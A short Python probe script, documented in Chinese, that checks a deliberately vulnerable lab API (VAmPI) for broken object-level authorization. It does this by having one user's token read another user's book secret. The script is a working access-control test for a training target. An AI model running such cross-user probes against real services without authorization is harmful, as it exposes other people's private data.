"""BOLA 探针:B 的 token 读 A 的 book secret。

vuln=1 → 200 + secret 泄露;vuln=0 → 阻断(403/404)。
用法:python probe_bola.py(需 VAMPI_BASE 指向已服务实例;先 GET /createdb)
"""

from _probe_lib import call, jbody, register_and_login, run, uniq, verdict


def main() -> int:
    call("GET", "/createdb")
    alice, ta = register_and_login(uniq("alice"))
    bob, tb = register_and_login(uniq("bob"))
    title = uniq("book")
    status, body = call(
        "POST", "/books/v1",
        {"book_title": title, "secret": "TOP-SECRET-42", "username": alice},
        token=ta,
    )
    if status not in (200, 201):
        return verdict("BOLA(book create)", False)
    status, body = call("GET", f"/books/v1/{title}", token=tb)  # B 读 A 的书
    leaked = status == 200 and "TOP-SECRET-42" in body
    return verdict("BOLA(cross-user book secret read)", leaked)


if __name__ == "__main__":
    run(main)
